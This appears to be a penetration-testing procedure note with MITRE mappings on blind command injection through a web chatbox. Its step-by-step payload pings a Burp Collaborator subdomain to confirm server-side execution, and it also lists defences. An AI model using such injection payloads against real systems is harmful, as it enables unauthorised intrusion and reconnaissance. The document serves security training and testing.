---
tags:
  - command-injection
  - blind-injection
type: procedure
tools:
  - '[[tools/Burp-Collaborator]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/ping-burpcollaborator]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Unix Shell]]'
updated_at: '2025-12-14T04:08:55.199Z'
skill_level: intermediate
impact_level: high
detection_risk: high
sub_techniques: []
id: ab32af27-c4c6-4451-9a51-f1e5e6940576
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Unix Shell]]'
---
# Inject-Command-for-Blind-Command-Injection

## Summary

This procedure demonstrates blind command injection by injecting a ping command into the chatbox, leveraging the SSRF endpoint to execute system commands without visible feedback on the client side.

## Description

Insufficient sanitization allows chat input to be interpreted as shell commands on the server. Using a ping to a Collaborator domain triggers a detectable DNS interaction, confirming execution and opening paths for reconnaissance or escalation.

## Requirements

1. Confirmed SSRF vulnerability
2. Burp Collaborator domain ready
3. Target chatbox accessible

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs to prevent command parsing
- Run web processes in isolated environments (e.g., containers)
- Monitor for anomalous DNS queries from application servers

## Objectives

1. Execute arbitrary commands blindly
2. Confirm injection success via OOB channel
3. Enable further system reconnaissance

## Instructions

### Step 1: Prepare Payload

**Context**: Craft the command payload using a unique Collaborator subdomain.

Generate a subdomain like 637c7wji9kaqwyxtncutltrw9nfd32.burpcollaborator.net.

> Payload: ping followed by the subdomain.

### Step 2: Submit Injection

**Context**: Inject the command into the chatbox to trigger execution.

Execute [[commands/ping-burpcollaborator]] by pasting into the chatbox and submitting.

```bash
ping 637c7wji9kaqwyxtncutltrw9nfd32.burpcollaborator.net
```

> No client-side output; success via external detection.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Unix Shell]]

### Sub-Techniques


## Commands Used

- [[commands/ping-burpcollaborator]]

## Tools Used

- [[tools/Burp-Collaborator]]

## Tags

- [[command-injection]]
- [[blind-injection]]
